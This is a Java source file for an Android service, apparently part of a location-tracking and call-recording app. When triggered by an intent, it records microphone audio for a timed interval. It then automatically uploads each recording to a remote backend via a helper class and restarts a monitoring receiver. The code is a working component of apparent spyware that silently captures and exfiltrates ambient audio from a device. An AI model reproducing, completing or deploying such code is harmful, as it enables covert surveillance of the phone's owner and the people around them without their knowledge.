package AutoVoiceRecorder;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;

import AutoCallRecorder.StateRecieverClas;
import AutoCallRecorder.mTools;
import synceAdapter.AccountConstants;
import synceAdapter.SharedClass;

import java.io.IOException;

import static android.content.ContentValues.TAG;

import com.varbin.locationtracker.APIs.CreaterClass;

public class VoiceRecorderService extends Service {
    MediaRecorder mRecorder;
    String sPath;
    String fName;
    int SleepTime;
    boolean isRecording;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null){
            return START_NOT_STICKY;
        }
        isRecording = intent.getBooleanExtra("isRecording", false);
        SleepTime = intent.getIntExtra("time" , 10000);
        if (isRecording){
            AccountConstants.isaudioRecording = true;
            startRecording();
        }else {
           // AccountConstants.isaudioRecording = false;
            stopRecording();
        }

        return super.onStartCommand(intent, flags, startId);
    }
    private void startRecording() {
        try {
            sPath = mTools.getPath();
        } catch (IOException e) {
            e.printStackTrace();
        }
//        mNumber = intent.getStringExtra("number");
        fName = sPath+"/"+"mNumber"+"-"+String.valueOf(System.currentTimeMillis()+".mp3");
        if (mRecorder!=null){
            mRecorder =  null;
        }
        mRecorder = new MediaRecorder();
        mRecorder.reset();
//        fName = sPath+"/"+"recording"+".mp3";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            mRecorder.setAudioSource(MediaRecorder.AudioSource.UNPROCESSED);
        }
        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mRecorder.setAudioSamplingRate(16000);
        mRecorder.setOutputFile(fName);

        try {
            mRecorder.prepare();

        } catch (IOException e) {
            Log.d(TAG, "onReceivenext: record e "+e);
            e.printStackTrace();
        }
        Log.d(TAG, "onReceivenext: record started");
        try {
            Log.d(TAG, "onReceivenext: seelping");
            mRecorder.start();
            Thread.sleep(SleepTime);
            Log.d(TAG, "onReceivenext: waked");
            stopRecording();
        }catch (Exception e){
            Log.d(TAG, "onReceivenext: record failed"+e);
        }
    }
    private void stopRecording() {
        Log.d(TAG, "onReceivenext: stopped");
        if (mRecorder == null){
            Log.d(TAG, "onReceivenext: stopped inside");
            return;
        }
        try {
            mRecorder.stop();
            boolean flag =  CreaterClass.FileDataUploader("sound_record", mTools.getDate(),fName , getApplicationContext());
            Log.d(TAG, "onReceivenext: data "+flag);
           if (!flag){
               AccountConstants.isaudioRecording = false;
               boolean flage = CreaterClass.inActive("sound_record" , this.getApplicationContext());
               Log.d(TAG, "onReceivenext: inactive "+flage);
           }
        }catch (Exception e){
            Log.d(TAG, "stopRecording Error: "+e);
        }
        startService(new Intent(this , StateRecieverClas.class));
        mRecorder.reset();
        mRecorder.release();
        mRecorder = null;
    }
}
